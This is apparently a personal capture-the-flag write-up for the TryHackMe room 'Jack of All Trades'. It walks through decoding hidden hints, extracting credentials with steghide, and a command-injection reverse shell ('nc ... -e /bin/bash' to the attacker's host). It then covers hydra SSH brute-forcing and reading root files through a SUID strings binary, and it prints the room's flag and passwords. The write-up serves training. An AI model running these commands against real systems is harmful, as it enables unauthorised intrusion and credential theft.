# Matheus Jesus 14-05-2020

## Try Hack Me - [Jack of All Trades](https://tryhackme.com/room/jackofalltrades)

### IP 10.10.83.173

### Recon

```text
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)

80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
```

```sh
gobuster dir -u http://10.10.83.173:22 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

### Way in

On :22, there is a letter from Jack,

view-source comment

```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

```sh
echo UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== | base64 -d
#Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

on /recovery.php, another comment

```html
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```

Decode to base32

```sh
echo GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= | base32 -d

# 45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246

# Decode to string

echo 45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246 | xxd -r -p

# Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F

# ROT13

# 'Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S' | ge 'N-Mn-m' 'A-MN-Za-mn-z'

# ROT13 On -> ge 'N-Mn-m' 'A-MN-Za-mn-z'
#tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Dirbuster found /assets folder with jpg files
Use the password u?WtKSraq to extract with steghide from header.jpg (tricky)

```sh
steghide extract -sf header.jpg
u?WtKSraq
# Username: jackinthebox
# Password: TplFxiSHjY
```

### Inside recovery.php

A cmd argument runs on server

```sh
recovery.php?cmd=nc 10.9.5.217 9999 -e /bin/bash
# On local SHELL
nc -lvnp 9999
python -c 'import pty; pty.spawn("/bin/bash")' # Stabilize

cd /home
cat jacks_password_lists # > jacks_pw_list file
```

### Brute force SSH

To gain access to jack user

```sh
hydra -l jack -P jacks_pw_list ssh://10.10.83.173 -s 80
# [80][ssh] host: 10.10.83.173   login: jack   password: ITMJpGGIqg1jn?>@
```

### User flag

```sh
scp -P 80 jack@10.10.83.173:user.jpg .
#It is in the picture
```

### SUID

```sh
find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
#/usr/bin/strings
```

GTFObins says it can read strings as root.

```sh
/usr/bin/strings /root/root.txt
# ToDo:
# 1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
# 2.Make T-Rex model!
# 3.Meet up with Johny for a pint or two
# 4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
# 5.Remember to finish that contract for Lisa.
# 6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
